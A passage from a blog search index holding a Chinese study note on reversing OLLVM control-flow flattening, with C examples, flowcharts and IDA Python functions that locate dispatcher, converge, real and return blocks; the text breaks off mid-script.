<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Angr 反混淆对抗 OLLVM</title>
    <link href="/2025/10/05/angr_ollvm/"/>
    <url>/2025/10/05/angr_ollvm/</url>
    
    <content type="html"><![CDATA[<p>参考是 <a href="https://bbs.kanxue.com/thread-286549.htm">https://bbs.kanxue.com/thread-286549.htm</a><br>以下都是对这位师傅文章的学习，做个记录</p><h3 id="对抗控制流平坦化-FLA"><a href="#对抗控制流平坦化-FLA" class="headerlink" title="对抗控制流平坦化 FLA"></a>对抗控制流平坦化 FLA</h3><p>Control Flow Flattening<br>其主要目标是打乱程序原有的控制流结构（如 if&#x2F;else、for、while、switch 等），干扰静态分析</p><p>原始代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">10</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;A\n&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;B\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;C\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>对应流程图</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs less"> <span class="hljs-selector-attr">[Start]</span><br>    |<br>  <span class="hljs-selector-attr">[x&gt;10?]</span><br>  /     \<br><span class="hljs-selector-attr">[A]</span>     <span class="hljs-selector-attr">[B]</span><br>  \     /<br>    <span class="hljs-selector-attr">[C]</span><br>    |<br>  <span class="hljs-selector-attr">[End]</span><br></code></pre></td></tr></table></figure><p>控制流平坦化的核心思想：<br>把原本的结构化控制流打散成多个基本块；用分发器和状态变量来控制基本块的执行顺序；去掉原有的直接跳转关系（比如 if&#x2F;else 分支），改为通过修改状态变量 + switch&#x2F;case 来控制跳转使</p><p>平坦化之后的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-type">int</span> state = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">switch</span> (state) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">10</span>) state = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">else</span> state = <span class="hljs-number">2</span>;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;A\n&quot;</span>);<br>                state = <span class="hljs-number">3</span>;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;B\n&quot;</span>);<br>                state = <span class="hljs-number">3</span>;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;C\n&quot;</span>);<br>                state = <span class="hljs-number">4</span>;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应流程图</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs less">        <span class="hljs-selector-attr">[Start]</span><br>           |<br>     <span class="hljs-selector-attr">[state = 0]</span><br>           |<br>     <span class="hljs-selector-attr">[Dispatcher]</span><br>           |<br>       +<span class="hljs-selector-tag">---</span>+<span class="hljs-selector-tag">---</span>+<br>       |       |<br>   <span class="hljs-selector-attr">[case 0]</span>   ...<br>       |<br>   <span class="hljs-selector-attr">[x &gt; 10 ?]</span><br>     /     \<br><span class="hljs-selector-attr">[state=1]</span> <span class="hljs-selector-attr">[state=2]</span><br>   |          |<br>   <span class="hljs-selector-tag">v</span>          <span class="hljs-selector-tag">v</span><br> <span class="hljs-selector-attr">[case 1]</span>   <span class="hljs-selector-attr">[case 2]</span><br> <span class="hljs-selector-attr">[print A]</span>  <span class="hljs-selector-attr">[print B]</span><br>   |          |<br>   +<span class="hljs-selector-tag">----</span>+<span class="hljs-selector-tag">-----</span>+<br>        |<br>    <span class="hljs-selector-attr">[state=3]</span><br>        |<br>     <span class="hljs-selector-attr">[case 3]</span><br>     <span class="hljs-selector-attr">[print C]</span><br>        |<br>    <span class="hljs-selector-attr">[state=4]</span><br>        |<br>     <span class="hljs-selector-attr">[case 4]</span><br>     <span class="hljs-selector-attr">[return]</span><br>        |<br>       <span class="hljs-selector-attr">[End]</span><br></code></pre></td></tr></table></figure><p>实际遇到的控制流平坦化远比示例复杂<br>一般标准的控制流平坦化 CFG 如下</p><p><img src="/../images/angr_ollvm/fla0.png"></p><p><strong>序言</strong>：函数开始执行的第一个基本块<br><strong>主&#x2F;子分发器</strong>：控制基本块执行顺序，序言的后继为主分发器<br><strong>预处理器</strong>：其后继为主分发器<br><strong>ret 块</strong>：函数出口，它是没有后继的<br><strong>真实块</strong>：混淆前的基本块，包含实际的代码逻辑，其后继为预处理器</p><p>ps:有关前驱和后继</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[A]</span> <span class="hljs-selector-tag">--</span> <span class="hljs-selector-tag">A</span> 是 <span class="hljs-selector-tag">B</span> 的前驱 <span class="hljs-selector-tag">--</span><br> |<br><span class="hljs-selector-attr">[B]</span><br> |<br><span class="hljs-selector-attr">[C]</span> <span class="hljs-selector-tag">--</span> <span class="hljs-selector-tag">C</span> 是 <span class="hljs-selector-tag">B</span> 的后继 <span class="hljs-selector-tag">--</span><br></code></pre></td></tr></table></figure><p>处理思路：</p><ol><li>找到所有真实块</li><li>找到真实块之间原本的跳转关系</li><li>重建控制流</li></ol><h4 id="找到所有真实块"><a href="#找到所有真实块" class="headerlink" title="找到所有真实块"></a>找到所有真实块</h4><ul><li>找到主分发器(循环头)</li><li>找到预处理器(汇聚块)</li><li>找到 ret 块</li><li>找到混淆前的真实块</li></ul><p><strong>找循环头</strong><br>使用 BFS 遍历 CFG，记录从起始块到每个块的路径，一旦在路径中发现某个块再次出现，说明有回路，这个块的起始地址就是一个循环头</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">A</span> → <span class="hljs-selector-tag">B</span> → <span class="hljs-selector-tag">C</span> → <span class="hljs-selector-tag">D</span><br>        ↑    |<br>        └────┘<br><span class="hljs-selector-tag">path</span> = <span class="hljs-selector-attr">[A, B, C, D]</span><br></code></pre></td></tr></table></figure><p>当后继再次遇到 C，就说明 D → C 是一条回路，因此 C 是一个循环头</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_loop_head</span>(<span class="hljs-params">start_ea</span>):<br>    loop_heads = <span class="hljs-built_in">set</span>()<br>    queue = deque() <span class="hljs-comment"># BFS 队列</span><br>    block = get_basic_block(start_ea) <span class="hljs-comment"># 获取起始地址所在的基本块</span><br>    queue.append((block,[]))<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(queue) &gt; <span class="hljs-number">0</span>:<br>        cur_block, path = queue.popleft()<br>        <span class="hljs-keyword">if</span> cur_block.start_ea <span class="hljs-keyword">in</span> path:<br>            loop_heads.add(cur_block.start_ea) <span class="hljs-comment"># 找到循环头</span><br>            <span class="hljs-keyword">continue</span><br>        path = path + [cur_block.start_ea] <span class="hljs-comment"># 更新路径</span><br>        queue.extend((s, path) <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> cur_block.succs()) <span class="hljs-comment"># 将后继加入队列</span><br>    <br>    all_loop_heads = <span class="hljs-built_in">list</span>(loop_heads)<br>    all_loop_heads.sort() <span class="hljs-comment"># 升序排序，确保主循环头在第一个</span><br>    <span class="hljs-keyword">return</span> all_loop_heads<br></code></pre></td></tr></table></figure><p><strong>找汇聚块</strong><br>对于标准的 FLA，循环头有两个前驱，一个是序言块，一个是汇聚块<br>示例的这个非标准的 FLA，其循环头和汇聚块的地址是相同的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_converge_addr</span>(<span class="hljs-params">loop_head_addr</span>):<br>    converge_addr = <span class="hljs-literal">None</span><br>    block = get_basic_block(loop_head_addr) <span class="hljs-comment"># 循环头</span><br>    preds = block.preds() <span class="hljs-comment"># 获取前驱基本块</span><br>    pred_list = <span class="hljs-built_in">list</span>(preds)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(pred_list) == <span class="hljs-number">2</span>: <span class="hljs-comment"># 标准 ollvm：循环头有两个前驱,一个序言块一个汇聚块</span><br>        <span class="hljs-keyword">for</span> pred <span class="hljs-keyword">in</span> pred_list:<br>            tmp_list = <span class="hljs-built_in">list</span>(pred.preds())<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp_list) &gt; <span class="hljs-number">1</span>: <span class="hljs-comment"># 有多个前驱的块是汇聚块</span><br>                converge_addr = pred.start_ea<br>    <span class="hljs-keyword">else</span>: <span class="hljs-comment"># 非标准 ollvm：循环头只有一个前驱,需要继续向前找</span><br>        converge_addr = loop_head_addr<br>    <span class="hljs-keyword">return</span> converge_addr<br></code></pre></td></tr></table></figure><p><strong>找真实块</strong><br>找到汇聚块之后就可以通过寻找其前驱的方式找到混淆前的所有真实块了<br>对于非标准的 FLA，汇聚块的前驱包含了序言块<br>而对于标准的 FLA，获取序言块需要从循环头的前驱中寻找并剔除掉其中的汇聚块</p><p>除此之外，还要注意的一个点是，有的基本块的尾部指令是相同的，反编译器在处理时会把它拿出来共享，这种情况下就需要把这些块的前驱也考虑进去，否则找到的真实块会不完整<br>示例：函数 sub_41D08 (sub441D08)中的 0x42288(0x00442288) 处</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_all_real_blocks</span>(<span class="hljs-params">fun_ea</span>):<br>    blocks = idaapi.FlowChart(idaapi.get_func(fun_ea))<br><br>    <span class="hljs-comment"># 获取循环头</span><br>    loop_heads = find_loop_head(fun_ea)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;循环头数量: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(loop_heads)&#125;</span>----<span class="hljs-subst">&#123;[<span class="hljs-built_in">hex</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> loop_heads]&#125;</span>&quot;</span>)<br>    all_real_blocks = []<br><br>    <span class="hljs-comment">#对每个循环头分析真实块</span><br>    <span class="hljs-keyword">for</span> loop_head_addr <span class="hljs-keyword">in</span> loop_heads:<br>        loop_head_block = get_basic_block(loop_head_addr)<br>        loop_head_preds = <span class="hljs-built_in">list</span>(loop_head_block.preds())<br>        loop_head_preds_addr = [b.start_ea <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> loop_head_preds]<br><br>        converge_addr = find_converge_addr(loop_head_addr)<br>        real_blocks = []<br><br>        <span class="hljs-comment"># 从循环头的前驱里剔除汇聚块，剩下序言块</span><br>        <span class="hljs-keyword">if</span> loop_head_addr != converge_addr:<br>            loop_head_preds_addr.remove(converge_addr)<br>            real_blocks.extend(loop_head_preds_addr)<br><br>        <span class="hljs-comment"># 分析汇聚块前驱，找真实块</span><br>        converge_block = get_basic_block(converge_addr)<br>        list_preds = <span class="hljs-built_in">list</span>(converge_block.preds())<br>        <span class="hljs-keyword">for</span> pred <span class="hljs-keyword">in</span> list_preds:<br>            end_ea = pred.end_ea<br>            last_inst_ea = idc.prev_head(end_ea)<br>            mnem = idc.print_insn_mnem(last_inst_ea)<br><br>            size = get_block_size(pred)<br>            <span class="hljs-keyword">if</span> size &gt; <span class="hljs-number">4</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;B.&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> mnem: <span class="hljs-comment"># 大于单指令块且不是跳转指令</span><br>                start_ea = pred.start_ea<br>                mnem = idc.print_insn_mnem(start_ea)<br>                <span class="hljs-keyword">if</span> mnem == <span class="hljs-string">&quot;CSEL&quot;</span>: <span class="hljs-comment"># 处理条件选择指令</span><br>                    csel_preds = pred.preds()<br>                    <span class="hljs-keyword">for</span> csel_pred <span class="hljs-keyword">in</span> csel_preds:<br>                        real_blocks.append(csel_pred.start_ea)<br>                <span class="hljs-keyword">else</span>:<br>                    real_blocks.append(start_ea)<br><br>        real_blocks.sort() <span class="hljs-comment"># 排序，第一个是序言块</span><br>        all_real_blocks.append(real_blocks)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;子循环头:&quot;</span>, [<span class="hljs-built_in">hex</span>(child_block_ea) <span class="hljs-keyword">for</span> child_block_ea <span class="hljs-keyword">in</span> real_blocks])<br></code></pre></td></tr></table></figure><p><strong>找 ret 块</strong><br>对于标准的 FLA，一般直接找没有后继的块即可<br>但是对于非标准的 FLA，只关注没有后继的块会遗漏部分真实代码 （0x42AB0处）<br>除此之外，还要考虑单跳转块和子分发器的情况</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[blockA]</span><br>   │<br>   ▼<br><span class="hljs-selector-attr">[jmp_to_ret]</span>    ← 只包含 <span class="hljs-number">1</span> 条跳转指令（长度<span class="hljs-number">4</span>）<br>   │<br>   ▼<br><span class="hljs-selector-attr">[ret_block]</span>     ← 真正包含 <span class="hljs-selector-tag">RET</span> 指令的块<br><br><br><span class="hljs-selector-attr">[blockA]</span><br>    │<br>    ▼<br><span class="hljs-selector-attr">[child_dispatcher1]</span>  ← 子分发器<span class="hljs-number">1</span><br>    │<br>    ▼<br><span class="hljs-selector-attr">[child_dispatcher2]</span>  ← 子分发器<span class="hljs-number">2</span><br>    │<br>    ▼<br><span class="hljs-selector-attr">[ret_block]</span>        ← 真正包含 <span class="hljs-selector-tag">RET</span> 指令的块<br></code></pre></td></tr></table></figure><p>这样使得最后返回的 block ：<br>如果有单跳转-&gt;回溯到上一个真实块<br>如果有子分发器-&gt;回退到 ori_ret_block<br>否则就是一开始找到的 ret 块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> idaapi<br><span class="hljs-keyword">import</span> idc<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque <span class="hljs-comment"># 用于 BFS 遍历</span><br><br><span class="hljs-comment"># 获取地址所在的基本块</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_basic_block</span>(<span class="hljs-params">ea</span>):<br>    func = idaapi.get_func(ea)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> func:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    f = idaapi.FlowChart(func) <span class="hljs-comment"># 获取函数的控制流图</span><br>    <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-keyword">if</span> block.start_ea &lt;= ea &lt; block.end_ea:<br>            <span class="hljs-keyword">return</span> block<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># 查找循环头（主分发器）</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_loop_head</span>(<span class="hljs-params">start_ea</span>):<br>    loop_heads = <span class="hljs-built_in">set</span>()<br>    queue = deque() <span class="hljs-comment"># BFS 队列</span><br>    block = get_basic_block(start_ea) <span class="hljs-comment"># 获取起始地址所在的基本块</span><br>    queue.append((block,[]))<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(queue) &gt; <span class="hljs-number">0</span>:<br>        cur_block, path = queue.popleft()<br>        <span class="hljs-keyword">if</span> cur_block.start_ea <span class="hljs-keyword">in</span> path:<br>            loop_heads.add(cur_block.start_ea) <span class="hljs-comment"># 找到循环头</span><br>            <span class="hljs-keyword">continue</span><br>        path = path + [cur_block.start_ea] <span class="hljs-comment"># 更新路径</span><br>        queue.extend((s, path) <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> cur_block.succs()) <span class="hljs-comment"># 将后继加入队列</span><br>    <br>    all_loop_heads = <span class="hljs-built_in">list</span>(loop_heads)<br>    all_loop_heads.sort() <span class="hljs-comment"># 升序排序，确保主循环头在第一个</span><br>    <span class="hljs-keyword">return</span> all_loop_heads<br><br><span class="hljs-comment"># 查找汇聚地址(预处理器)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_converge_addr</span>(<span class="hljs-params">loop_head_addr</span>):<br>    converge_addr = <span class="hljs-literal">None</span><br>    block = get_basic_block(loop_head_addr) <span class="hljs-comment"># 循环头</span><br>    preds = block.preds() <span class="hljs-comment"># 获取前驱基本块</span><br>    pred_list = <span class="hljs-built_in">list</span>(preds)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(pred_list) == <span class="hljs-number">2</span>: <span class="hljs-comment"># 标准 ollvm：循环头有两个前驱,一个序言块一个汇聚块</span><br>        <span class="hljs-keyword">for</span> pred <span class="hljs-keyword">in</span> pred_list:<br>            tmp_list = <span class="hljs-built_in">list</span>(pred.preds())<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp_list) &gt; <span class="hljs-number">1</span>: <span class="hljs-comment"># 有多个前驱的块是汇聚块</span><br>                converge_addr = pred.start_ea<br>    <span class="hljs-keyword">else</span>: <span class="hljs-comment"># 非标准 ollvm：循环头只有一个前驱,需要继续向前找</span><br>        converge_addr = loop_head_addr<br>    <span class="hljs-keyword">return</span> converge_addr<br><br><span class="hljs-comment"># 获取基本块大小</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_block_size</span>(<span class="hljs-params">block</span>):<br>    <span class="hljs-keyword">return</span> block.end_ea - block.start_ea<br><br><span class="hljs-comment"># 查找 ret 块地址</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_ret_block</span>(<span class="hljs-params">blocks</span>):<br>    <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks:<br>        succs = <span class="hljs-built_in">list</span>(block.succs()) <span class="hljs-comment"># 获取后继块</span><br>        succs_list = <span class="hljs-built_in">list</span>(succs)<br><br>        end_ea = block.end_ea <span class="hljs-comment"># end_ea 指向基本块最后一条指令的下一个地址</span><br>        last_inst_ea = idc.prev_head(end_ea) <span class="hljs-comment"># 获取基本块最后一条指令地址</span><br>        mnem = idc.print_insn_mnem(last_inst_ea) <span class="hljs-comment"># 获取指令助记符</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(succs_list) == <span class="hljs-number">0</span>: <span class="hljs-comment"># 没有后继块</span><br>            <span class="hljs-keyword">if</span> mnem == <span class="hljs-string">&quot;RET&quot;</span>: <span class="hljs-comment"># 最后一条指令是 ret 指令</span><br>                ori_ret_block = block<br><br>                <span class="hljs-comment"># 向上寻找更合适的 ret 块</span><br>                <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                    tmp_block = block.preds()<br>                    pred_list = <span class="hljs-built_in">list</span>(tmp_block)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(pred_list) == <span class="hljs-number">1</span>: <span class="hljs-comment"># 只有一个前驱</span><br>                        block = pred_list[<span class="hljs-number">0</span>]<br>                        <span class="hljs-keyword">if</span> get_block_size(block) == <span class="hljs-number">4</span>: <span class="hljs-comment"># 单指令块</span><br>                            <span class="hljs-keyword">continue</span><br>                        <span class="hljs-keyword">else</span>:<br>                            <span class="hljs-keyword">break</span><br>                    <span class="hljs-keyword">else</span>: <span class="hljs-comment"># 多个前驱或者无前驱</span><br>                        <span class="hljs-keyword">break</span><br>    <br>                <span class="hljs-comment"># 处理子分发器情况</span><br>                block2 = block<br>                num = <span class="hljs-number">0</span><br>                i = <span class="hljs-number">0</span><br>                <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                    i += <span class="hljs-number">1</span><br>                    succs_block = block2.succs()<br>                    <span class="hljs-keyword">for</span> succ <span class="hljs-keyword">in</span> succs_block:<br>                        child_succs = succ.succs()<br>                        succ_list = <span class="hljs-built_in">list</span>(child_succs)<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(succ_list) != <span class="hljs-number">0</span>:<br>                            block2 = succ<br>                            num += <span class="hljs-number">1</span><br>                    <span class="hljs-keyword">if</span> num &gt; <span class="hljs-number">2</span>:<br>                        block = ori_ret_block<br>                        <span class="hljs-keyword">break</span><br>                    <span class="hljs-keyword">if</span> i &gt; <span class="hljs-number">2</span>:<br>                        <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">return</span> block.start_ea<br><br><span class="hljs-comment"># 最后返回的 block ：</span><br><span class="hljs-comment"># 如果有单跳转-&gt;回溯到上一个真实块</span><br><span class="hljs-comment"># 